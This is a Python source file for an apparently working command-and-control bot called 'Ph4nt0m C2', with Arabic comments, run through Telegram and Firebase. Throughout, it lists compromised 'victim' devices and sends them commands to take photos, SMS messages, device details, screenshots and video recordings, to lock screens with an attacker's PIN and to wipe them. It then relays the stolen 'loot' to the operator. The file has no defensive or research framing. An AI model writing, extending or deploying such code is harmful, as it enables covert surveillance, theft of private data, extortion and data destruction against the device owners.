#!/usr/bin/env python3
"""
Ph4nt0m C2 Bot - Complete
"""
import os, json, threading, time, requests, base64
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
from firebase_admin import credentials, initialize_app, db

# ========== Flask للمنفذ الوهمي ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "System Active"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    flask_app.run(host='0.0.0.0', port=port)

# ========== إعدادات Firebase ==========
BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]

firebase_creds = os.environ.get("FIREBASE_CREDS")
if firebase_creds:
    cred = credentials.Certificate(json.loads(firebase_creds))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}  # user_id -> victim_id
last_loot_counter = {}  # vid -> آخر counter تم عرضه

# ========== حالات المحادثة ==========
ASK_PIN = 1
ASK_NOTIFY_MSG = 2

# ========== دوال مساعدة ==========
def get_online_victims():
    snap = victims_ref.get()
    if not snap:
        return {}
    return {k: v for k, v in snap.items() if v.get('online')}

async def send_file_to_telegram(update, data_bytes, filename, caption):
    try:
        await update.message.reply_document(document=data_bytes, filename=filename, caption=caption)
    except:
        pass

async def send_fresh_loot(update, vid):
    """إرسال المسروقات الجديدة فقط"""
    loot = db.reference(f'victims/{vid}/loot').get()
    if not loot:
        await update.message.reply_text("لا توجد مسروقات بعد.")
        return

    items = sorted(loot.items(), key=lambda x: x[1].get('counter', 0))
    last = last_loot_counter.get(vid, 0)
    fresh = [i for i in items if i[1].get('counter', 0) > last]

    if not fresh:
        await update.message.reply_text("لا توجد مسروقات جديدة منذ آخر فحص.")
        return

    count = 0
    for key, item in fresh:
        typ = item.get('type', '?')
        name = item.get('name', typ)
        url = item.get('url')
        info = item.get('info')

        if info:
            if typ == 'sms':
                messages = info if isinstance(info, list) else [info]
                txt = "📱 **رسائل SMS:**\n"
                for msg in messages[:10]:
                    if isinstance(msg, dict):
                        txt += f"👤 {msg.get('from','?')}: {msg.get('body','')[:50]}\n"
                await update.message.reply_text(txt[:4000])
            else:
                # معلومات الجهاز أو أي معلومات أخرى
                txt = json.dumps(info, indent=2, ensure_ascii=False)
                await update.message.reply_text(f"📋 **معلومات:**\n```\n{txt[:3500]}\n```")
            count += 1
            continue

        if url:
            try:
                r = requests.get(url)
                if r.status_code == 200:
                    ext = 'png' if typ in ('screenshot', 'stealth_photo', 'photo') else 'webm' if typ == 'video' else 'bin'
                    await send_file_to_telegram(update, r.content, f"{name}.{ext}", f"📎 {name}")
                    count += 1
            except:
                pass

    if count == 0 and not any(i[1].get('info') for i in fresh):
        await update.message.reply_text("تم استلام بيانات جديدة.")

    if fresh:
        last_loot_counter[vid] = fresh[-1][1].get('counter', 0)

# ========== لوحات الأزرار ==========
def get_victims_keyboard():
    keyboard = []
    vics = get_online_victims()
    for vid, info in vics.items():
        fg = info.get('fingerprint', {})
        label = f"🖥 {vid} ({fg.get('plat', '?')})"
        keyboard.append([InlineKeyboardButton(label, callback_data=f'select_{vid}')])
    keyboard.append([
        InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims'),
        InlineKeyboardButton("🗑️ مسح الكل", callback_data='delete_all_victims')
    ])
    return InlineKeyboardMarkup(keyboard)

def get_control_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 سحب كل الصور", callback_data='get_all_photos')],
        [InlineKeyboardButton("💬 سحب SMS", callback_data='get_all_sms'),
         InlineKeyboardButton("📋 معلومات الجهاز", callback_data='get_device_info')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'),
         InlineKeyboardButton("🎥 فيديو 10ث", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش تشغيل", callback_data='flash_on'),
         InlineKeyboardButton("💡 فلاش إطفاء", callback_data='flash_off')],
        [InlineKeyboardButton("🔔 إرسال إشعار", callback_data='send_notify')],
        [InlineKeyboardButton("🔒 قفل برمز", callback_data='set_pin')],
        [InlineKeyboardButton("💣 فرمتة", callback_data='format'),
         InlineKeyboardButton("🚫 مسح الجلسة", callback_data='leave')],
        [InlineKeyboardButton("🔙 رجوع للضحايا", callback_data='back_to_victims')]
    ])

# ========== أوامر البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ **Ph4nt0m C2 - Ready**",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا المتصلين", callback_data='show_victims')]
        ])
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data

    # ========== عرض القائمة / رجوع ==========
    if data in ('show_victims', 'back_to_victims', 'refresh_victims'):
        vics = get_online_victims()
        if not vics:
            await query.edit_message_text("لا توجد أجهزة متصلة حالياً.", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims')]
            ]))
            return
        await query.edit_message_text("📟 **الضحايا المتصلين:**", reply_markup=get_victims_keyboard())
        if current_victim.get(uid):
            del current_victim[uid]
        return

    # ========== مسح جميع الأجهزة ==========
    if data == 'delete_all_victims':
        victims_ref.delete()
        last_loot_counter.clear()
        if current_victim.get(uid):
            del current_victim[uid]
        await query.edit_message_text("🗑️ تم مسح جميع الأجهزة.", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
        ]))
        return

    # ========== اختيار ضحية ==========
    if data.startswith('select_'):
        vid = data.split('_', 1)[1]
        vics = get_online_victims()
        if vid not in vics:
            await query.edit_message_text("الجهاز غير متصل الآن.", reply_markup=get_victims_keyboard())
            return
        current_victim[uid] = vid
        if vid not in last_loot_counter:
            last_loot_counter[vid] = 0
        fg = vics[vid].get('fingerprint', {})
        await query.edit_message_text(
            f"✅ **الجهاز:** `{vid}`\n📱 النظام: {fg.get('plat', '?')}",
            reply_markup=get_control_keyboard()
        )
        return

    # ========== التحقق من جلسة ==========
    vid = current_victim.get(uid)
    if not vid:
        await query.edit_message_text("انتهت الجلسة. اختر جهازاً:", reply_markup=get_victims_keyboard())
        return

    # ========== مسح جلسة جهاز ==========
    if data == 'leave':
        victims_ref.child(vid).delete()
        if vid in last_loot_counter:
            del last_loot_counter[vid]
        if current_victim.get(uid) == vid:
            del current_victim[uid]
        await query.edit_message_text("🚫 تم مسح الجلسة والجهاز.", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
        ]))
        return

    # ========== قفل برمز ==========
    if data == 'set_pin':
        await query.edit_message_text("🔢 أرسل رمز PIN مكون من 4 أرقام:")
        return ASK_PIN

    # ========== إرسال إشعار ==========
    if data == 'send_notify':
        await query.edit_message_text("🔔 أرسل نص الإشعار الذي تريد إظهاره:")
        return ASK_NOTIFY_MSG

    # ========== معلومات الجهاز ==========
    if data == 'get_device_info':
        db.reference(f'victims/{vid}/command').set({"action": "get_device_info"})
        await query.edit_message_text("✅ جاري جمع معلومات الجهاز...", reply_markup=get_control_keyboard())
        time.sleep(2)
        await send_fresh_loot(query, vid)
        return

    # ========== الأوامر المباشرة ==========
    params = {}
    if data == 'vibrate':
        params['duration'] = 5000
    elif data == 'record_video':
        params['duration'] = 10

    cmd = {"action": data, **params}
    db.reference(f'victims/{vid}/command').set(cmd)
    await query.edit_message_text(f"✅ تم إرسال الأمر: {data}", reply_markup=get_control_keyboard())

    # إرسال المسروقات تلقائياً بعد الأوامر التي تنتج بيانات
    if data in ('get_all_photos', 'get_all_sms', 'screenshot'):
        time.sleep(3)
        await send_fresh_loot(query, vid)

# ========== استقبال رمز PIN ==========
async def receive_pin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.message.from_user.id
    pin = update.message.text.strip()
    if len(pin) != 4 or not pin.isdigit():
        await update.message.reply_text("❌ يجب أن يكون الرمز مكوناً من 4 أرقام. حاول مجدداً:")
        return ASK_PIN
    vid = current_victim.get(uid)
    if not vid:
        await update.message.reply_text("انتهت الجلسة.")
        return ConversationHandler.END
    db.reference(f'victims/{vid}/command').set({"action": "lock_screen", "pin": pin})
    await update.message.reply_text(f"🔒 تم إرسال أمر القفل بالرمز: {pin}")
    return ConversationHandler.END

# ========== استقبال نص الإشعار ==========
async def receive_notify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.message.from_user.id
    msg = update.message.text.strip()
    if not msg:
        await update.message.reply_text("❌ أرسل نصاً صالحاً:")
        return ASK_NOTIFY_MSG
    vid = current_victim.get(uid)
    if not vid:
        await update.message.reply_text("انتهت الجلسة.")
        return ConversationHandler.END
    db.reference(f'victims/{vid}/command').set({"action": "send_notification", "message": msg})
    await update.message.reply_text(f"🔔 تم إرسال الإشعار: {msg}")
    return ConversationHandler.END

# ========== التشغيل ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # محادثات PIN والإشعار
    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(button_handler, pattern='^set_pin$'),
            CallbackQueryHandler(button_handler, pattern='^send_notify$')
        ],
        states={
            ASK_PIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_pin)],
            ASK_NOTIFY_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_notify)]
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(conv_handler)
    print("🤖 Ph4nt0m Bot Started...")
    app.run_polling()

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    main()
